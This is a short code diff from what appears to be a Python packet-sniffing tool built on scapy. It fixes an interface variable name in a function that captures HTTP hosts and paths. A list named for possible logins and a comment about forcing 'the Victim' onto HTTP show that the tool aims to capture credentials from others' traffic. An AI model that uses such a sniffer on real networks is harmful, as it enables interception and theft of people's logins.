@@ -15,7 +15,7 @@ PossibleLoginList = []
 InterFace = input("\n[+] Enter Interface: ") # EX: eth0 , wlan0
 
 def StartSniffData(NetowrkInterface):
-	scapy.sniff(iface=Interface,store=False,prn=SniffNetworkTrafic)
+	scapy.sniff(iface=NetowrkInterface,store=False,prn=SniffNetworkTrafic)
 
 def GetDataFromHTTP(packet): # Get Data From HTTP Requests And Responses If You Want To Capture HTTPS Reqqests And Responses You Have To Force The Victim To Use HTTP Protocol!
 	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
